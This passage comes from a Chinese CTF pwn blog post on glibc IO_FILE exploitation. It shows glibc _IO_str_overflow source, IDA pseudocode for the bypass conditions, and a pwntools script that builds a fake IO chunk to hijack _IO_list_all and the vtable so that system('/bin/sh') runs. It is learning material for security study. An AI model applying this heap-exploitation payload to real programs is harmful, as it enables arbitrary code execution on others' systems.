class=\"line\">      else</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t  char *new_buf;</span><br><span class=\"line\">\t  char *old_buf = fp-&gt;_IO_buf_base;</span><br><span class=\"line\">\t  size_t old_blen = _IO_blen (fp);</span><br><span class=\"line\">\t  _IO_size_t new_size = 2 * old_blen + 100;</span><br><span class=\"line\">\t  if (new_size &lt; old_blen)</span><br><span class=\"line\">\t    return EOF;</span><br><span class=\"line\">\t  new_buf</span><br><span class=\"line\">\t    = (char *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);</span><br><span class=\"line\">\t  if (new_buf == NULL)</span><br><span class=\"line\">\t    &#123;</span><br><span class=\"line\">\t      /*\t  __ferror(fp) = 1; */</span><br><span class=\"line\">\t      return EOF;</span><br><span class=\"line\">\t    &#125;</span><br><span class=\"line\">\t  if (old_buf)</span><br><span class=\"line\">\t    &#123;</span><br><span class=\"line\">\t      memcpy (new_buf, old_buf, old_blen);</span><br><span class=\"line\">\t      (*((_IO_strfile *) fp)-&gt;_s._free_buffer) (old_buf);</span><br><span class=\"line\">\t      /* Make sure _IO_setb won&apos;t try to delete _IO_buf_base. */</span><br><span class=\"line\">\t      fp-&gt;_IO_buf_base = NULL;</span><br><span class=\"line\">\t    &#125;</span><br><span class=\"line\">\t  memset (new_buf + old_blen, &apos;\\0&apos;, new_size - old_blen);</span><br><span class=\"line\"></span><br><span class=\"line\">\t  _IO_setb (fp, new_buf, new_buf + new_size, 1);</span><br><span class=\"line\">\t  fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class=\"line\">\t  fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class=\"line\">\t  fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class=\"line\">\t  fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class=\"line\"></span><br><span class=\"line\">\t  fp-&gt;_IO_write_base = new_buf;</span><br><span class=\"line\">\t  fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  if (!flush_only)</span><br><span class=\"line\">    *fp-&gt;_IO_write_ptr++ = (unsigned char) c;</span><br><span class=\"line\">  if (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class=\"line\">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class=\"line\">  return c;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>最后构造的<code>chunk</code>如下，主要的变化其实就是加了一定新的条件的绕过和将<code>vtable</code>改成了<code>_IO_str_overflow</code>，具体在libc中找该地址偏移时，可以通过<code>vsprintf</code>函数看索引<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__IO_vsprintf (char *string, const char *format, _IO_va_list args)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  _IO_strfile sf;</span><br><span class=\"line\">  int ret;</span><br><span class=\"line\"></span><br><span class=\"line\">#ifdef _IO_MTSAFE_IO</span><br><span class=\"line\">  sf._sbf._f._lock = NULL;</span><br><span class=\"line\">#endif</span><br><span class=\"line\">  _IO_no_init (&amp;sf._sbf._f, _IO_USER_LOCK, -1, NULL, NULL);</span><br><span class=\"line\">  _IO_JUMPS (&amp;sf._sbf) = &amp;_IO_str_jumps;    // reference of _IO_str_jumps</span><br><span class=\"line\">  _IO_str_init_static_internal (&amp;sf, string, -1, string);</span><br><span class=\"line\">  ret = _IO_vfprintf (&amp;sf._sbf._f, format, args);</span><br><span class=\"line\">  _IO_putc_unlocked (&apos;\\0&apos;, &amp;sf._sbf._f);</span><br><span class=\"line\">  return ret;</span><br></pre></td></tr></table></figure></p>\n<p>具体绕过的条件可以用ida看伪c的方法，或者调试来慢慢满足<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  v4 = (_BYTE *)*((_QWORD *)fp + <span class=\"number\">5</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">v5 = *((_QWORD *)fp + <span class=\"number\">7</span>);</span><br><span class=\"line\">v6 = *((_QWORD *)fp + <span class=\"number\">8</span>) - v5;</span><br><span class=\"line\"><span class=\"keyword\">if</span> ( (<span class=\"keyword\">unsigned</span> __int64)&amp;v4[-*((_QWORD *)fp + <span class=\"number\">4</span>)] &gt;= v6 + (a2 == <span class=\"number\">-1</span>) )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v2 &amp; <span class=\"number\">1</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0xFFFFFFFF</span>LL;</span><br><span class=\"line\">  v7 = <span class=\"number\">2</span> * v6 + <span class=\"number\">100</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v6 &gt; v7 )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0xFFFFFFFF</span>LL;</span><br><span class=\"line\">  v8 = (*((__int64 (__fastcall **)(<span class=\"keyword\">unsigned</span> __int64))fp + <span class=\"number\">0x1C</span>))(<span class=\"number\">2</span> * v6 + <span class=\"number\">100</span>);</span><br><span class=\"line\">  v9 = v8;</span><br></pre></td></tr></table></figure></p>\n<p>参照<a href=\"http://simp1e.leanote.com/post/Hctf-2017-babyprintf\" target=\"_blank\" rel=\"external\">hctf babyprintf</a>，构造如下的<code>fake IO chunk</code>即可<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vtable_addr = libc.address + <span class=\"number\">0x3BE4C0</span>   <span class=\"comment\"># _IO_str_overflow</span></span><br><span class=\"line\">fake_chunk = p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x61</span>)</span><br><span class=\"line\">fake_chunk += p64(<span class=\"number\">0xddaa</span>) + p64(libc.symbols[<span class=\"string\">'_IO_list_all'</span>]<span class=\"number\">-0x10</span>) <span class=\"comment\"># change io list all to arena</span></span><br><span class=\"line\">fake_chunk += p64(<span class=\"number\">0xffffffffffffff</span>)+p64(<span class=\"number\">0x2</span>)+p64(<span class=\"number\">0</span>)*<span class=\"number\">2</span>+ p64( (real_binsh<span class=\"number\">-0x64</span>)/<span class=\"number\">2</span> )   <span class=\"comment\"># ptr to '/bin/sh\\x00'</span></span><br><span class=\"line\">fake_chunk = fake_chunk.ljust(<span class=\"number\">0xa0</span>, chr(<span class=\"number\">0</span>))</span><br><span class=\"line\">fake_chunk += p64(libc.symbols[<span class=\"string\">\"system\"</span>]+<span class=\"number\">0x420</span>)</span><br><span class=\"line\">fake_chunk = fake_chunk.ljust(<span class=\"number\">0xc0</span>, chr(<span class=\"number\">0</span>))</span><br><span class=\"line\">fake_chunk += p64(<span class=\"number\">1</span>) + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">fake_chunk += p64(vtable_addr) + p64(libc.symbols[<span class=\"string\">\"system\"</span>]) + p64(<span class=\"number\">2</span>) + p64(<span class=\"number\">3</span>)</span><br><span class=\"line\"><span class=\"comment\"># copy 2 write 一气呵成</span></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"Reference\"><a href=\"#Reference\" class=\"headerlink\" title=\"Reference\"></a>Reference</h2><ol>\n<li><a href=\"http://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/\" target=\"_blank\" rel=\"external\">IO_FILE学习笔记</a></li>\n<li><a href=\"http://simp1e.leanote.com/post/Hctf-2017-babyprintf\" target=\"_blank\" rel=\"external\">babyprintf</a></li>\n</ol>\n<h2 id=\"tips\"><a href=\"#tips\" class=\"headerlink\" title=\"tips\"></a>tips</h2><ol>\n<li>终于搞懂了整个流程，从源码到libc，orz。</li>\n<li>关于bypass的问题省略了，因为基本已经算是通用的东西了，具体的其他类型的IO_FILE利用还是得再看源码，结合偏移以及适当的调试来搞</li>\n</ol>\n<blockquote>\n<p>to be continued</p>\n</blockquote>\n","primarycolor":"cyan","accentcolor":"cyan","categories":[{"name":"Binary","path":"api/categories/Binary.json"}],"tags":[{"name":"Pwn","path":"api/tags/Pwn.json"}]}